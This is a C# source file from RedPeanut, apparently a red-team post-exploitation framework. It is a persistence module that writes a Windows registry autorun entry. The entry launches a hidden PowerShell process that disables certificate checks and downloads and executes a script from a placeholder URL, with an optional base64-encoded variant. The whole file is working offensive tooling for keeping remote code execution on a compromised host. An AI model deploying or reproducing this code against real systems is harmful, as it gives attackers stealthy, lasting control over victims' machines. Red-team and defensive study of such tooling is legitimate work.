//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using Win = Microsoft.Win32;
using System.Linq;

class PersAutorun
{
    static bool encoded = bool.Parse("#ENCODED#");
    static string regHive = "#REGHIVE#";
    static string commandsrc = @"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex((New-Object system.net.WebClient).DownloadString('#URL#'))";
    static string command = @"C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -w 1 -command ""#PAYLOAD#""";
    static string commandenc = @"C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -w 1 -enc #PAYLOAD#";
    static string name = "#NAME#";

    public static void Execute(string[] args)
    {
        if (SharpSploit.Persistence.Autorun.InstallAutorun(SharpSploit.Enumeration.Registry.ConvertToRegistryHive(regHive), GetEncodedScript(encoded), name))
            Console.WriteLine("[*] Autorun installed");
        else
            Console.WriteLine("[*] Autorun not installed");
    }

    private static string GetEncodedScript(bool encoded)
    {
        if (encoded)
            return commandenc.Replace("#PAYLOAD#",Convert.ToBase64String(Encoding.Unicode.GetBytes(commandsrc)));
        else
            return command.Replace("#PAYLOAD#",commandsrc);
    }
    
}
